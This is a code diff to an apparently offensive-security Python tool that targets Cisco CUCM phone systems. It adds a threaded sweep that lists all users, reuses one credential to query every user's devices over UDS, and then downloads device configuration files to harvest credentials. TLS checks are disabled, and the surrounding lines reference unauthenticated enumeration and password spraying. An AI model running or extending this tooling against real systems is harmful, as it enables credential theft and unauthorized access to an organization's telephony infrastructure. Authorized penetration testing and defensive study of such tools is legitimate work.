@@ -922,18 +922,77 @@ def enumerate_devices_unauthenticated(cucm_host, port, usernames, db_file, threa
     return found_count
 
 
-def get_user_devices_authenticated(cucm_host, username, password, port=UDS_PORT, timeout=10):
+def enumerate_devices_authenticated(cucm_host, username, password, port, usernames,
+                                    db_file, threads=10, no_db=False, _probe_fn=None):
     """
-    Authenticated UDS lookup: GET /cucm-uds/user/{username} as that end user
-    (HTTP Basic auth). This is the per-user, end-user-scoped endpoint — it does
-    not require CCM Admin / AXL privileges.
+    Query each target username's UDS devices using the single (username, password)
+    credential, in parallel. Logs found SEP names to uds_devices with
+    source='uds_auth' (recording the target username) unless no_db is True.
+
+    Returns:
+      {
+        'devices': {target_username: [SEP names]},  # only users with >=1 device
+        'ok': int,        # targets that returned HTTP 200
+        'denied': int,    # targets that returned 401
+        'errors': int,    # targets that returned an error/other status
+      }
+    _probe_fn(cucm_host, username, password, port, target_user) is injectable for
+    testing; defaults to get_user_devices_authenticated.
+    """
+    if _probe_fn is None:
+        def _probe_fn(c_host, c_user, c_pass, c_port, t_user):
+            return get_user_devices_authenticated(c_host, c_user, c_pass, port=c_port, target_user=t_user)
+
+    result = {'devices': {}, 'ok': 0, 'denied': 0, 'errors': 0}
+    lock = threading.Lock()
+    work = queue.Queue()
+    for u in usernames:
+        work.put(u)
+
+    def worker():
+        while True:
+            try:
+                target_user = work.get_nowait()
+            except queue.Empty:
+                return
+            status, devices = _probe_fn(cucm_host, username, password, port, target_user)
+            with lock:
+                if status == 'ok':
+                    result['ok'] += 1
+                    if devices:
+                        result['devices'][target_user] = devices
+                elif status == 'unauthorized':
+                    result['denied'] += 1
+                else:
+                    result['errors'] += 1
+            if status == 'ok' and devices and not no_db:
+                for device_name in devices:
+                    log_uds_device(cucm_host, target_user, device_name, 'uds_auth', db_file)
+
+    thread_list = [threading.Thread(target=worker, daemon=True)
+                   for _ in range(max(1, min(threads, len(usernames))))]
+    for t in thread_list:
+        t.start()
+    for t in thread_list:
+        t.join()
+    return result
+
+
+def get_user_devices_authenticated(cucm_host, username, password, port=UDS_PORT, timeout=10, target_user=None):
+    """
+    Authenticated UDS lookup: GET /cucm-uds/user/{target_user} authenticating as
+    (username, password) via HTTP Basic auth. target_user defaults to username
+    (query your own record). Passing a different target_user queries another
+    user's record with the same credential — useful for sweeping all users with
+    one working credential; the server decides whether to authorize it.
 
     Returns (status, devices):
       'ok'           — HTTP 200; devices is the parsed SEP list (may be empty).
       'unauthorized' — HTTP 401; creds rejected. devices is [].
       'error'        — network failure or other status. devices is [].
     """
-    url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(username, safe="")}'
+    target = target_user if target_user is not None else username
+    url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(target, safe="")}'
     dbg(f'UDS authed GET {url} (timeout={timeout}s)')
     try:
         resp = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
@@ -2664,31 +2723,32 @@ def main():
             print('--uds-devices requires both --uds-user and --uds-password')
             quit(1)
 
-        print(f'Discovering devices for user {args.uds_user!r} via '
-              f'https://{CUCM_host}:{args.uds_port}/cucm-uds/user/{quote(args.uds_user, safe="")}')
-        status, devices = get_user_devices_authenticated(
-            CUCM_host, args.uds_user, args.uds_password, port=args.uds_port,
-        )
-        if status == 'unauthorized':
-            print(f'[-] UDS rejected credentials for {args.uds_user!r} (HTTP 401)')
-            quit(1)
-        if status == 'error':
-            print(f'[-] Could not query UDS devices for {args.uds_user!r} (run with -d for details)')
-            quit(1)
-        if not devices:
-            print(f'[-] Authenticated successfully, but no devices are associated with {args.uds_user!r}')
+        print(f'Enumerating users from https://{CUCM_host}:{args.uds_port}/cucm-uds/users')
+        users = get_users_api(CUCM_host, port=args.uds_port)
+        if not users:
+            print('[-] No users returned from UDS — cannot sweep devices (run with -d for details)')
             quit(0)
 
-        print(f'[+] Discovered {len(devices)} device(s):')
-        for device_name in devices:
-            print(f'    {device_name}')
-            if not no_db:
-                log_uds_device(CUCM_host, args.uds_user, device_name, 'uds_auth', db_file)
+        print(f'[*] Sweeping devices for {len(users)} user(s) using credentials for {args.uds_user!r}...')
+        sweep = enumerate_devices_authenticated(
+            CUCM_host, args.uds_user, args.uds_password, args.uds_port,
+            users, db_file, threads=threads, no_db=no_db,
+        )
+
+        all_seps = sorted({dev for devs in sweep['devices'].values() for dev in devs})
+        print(f'[+] Sweep complete: {sweep["ok"]} ok, {sweep["denied"]} denied, '
+              f'{sweep["errors"]} error(s); {len(all_seps)} unique device(s) found across '
+              f'{len(sweep["devices"])} user(s)')
+        for target_user in sorted(sweep['devices']):
+            print(f'    {target_user}: {", ".join(sorted(sweep["devices"][target_user]))}')
+
+        if not all_seps:
+            quit(0)
 
         hits = download_uds_discovered_configs(
-            CUCM_host, devices, db_file, use_tftp=use_tftp, no_db=no_db,
+            CUCM_host, all_seps, db_file, use_tftp=use_tftp, no_db=no_db,
         )
-        print(f'[+] Config download complete: {hits}/{len(devices)} configs yielded credentials')
+        print(f'[+] Config download complete: {hits}/{len(all_seps)} configs yielded credentials')
         quit(0)
 
     if args.spray:
